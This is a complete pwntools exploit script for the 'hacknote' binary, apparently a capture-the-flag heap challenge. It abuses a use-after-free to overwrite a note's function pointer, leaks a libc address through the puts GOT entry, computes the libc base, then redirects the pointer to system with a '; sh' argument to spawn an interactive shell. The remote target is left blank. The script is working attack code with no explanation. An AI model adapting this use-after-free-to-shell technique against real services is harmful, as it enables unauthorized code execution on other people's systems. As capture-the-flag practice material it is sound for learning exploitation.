#!/usr/bin/python3

from pwn import *

exe = ELF('hacknote_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def add(size, content):
    sla(b"choice :", b"1")
    sla(b"size :", size)
    sa(b"Content :", content)
def delete(index):
    sla(b"choice :", b"2")
    sla(b"Index :", index)
def show(index):
    sla(b"choice :", b"3")
    sla(b"Index :", index)

add(b"40", b"0" * 4)
add(b"48", b"1")
delete(b"0")
delete(b"1")
add(b"8", p32(0x0804862b) + p32(exe.got['puts']))
show(b"0")
libc_leak = u32(p.recv(4))
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))
delete(b"2")
one_gadget = [0x3a819, 0x5f065, 0x5f066]
add(b"8", p32(libc.sym['system']) + b"; sh")
show(b"0")
p.interactive()
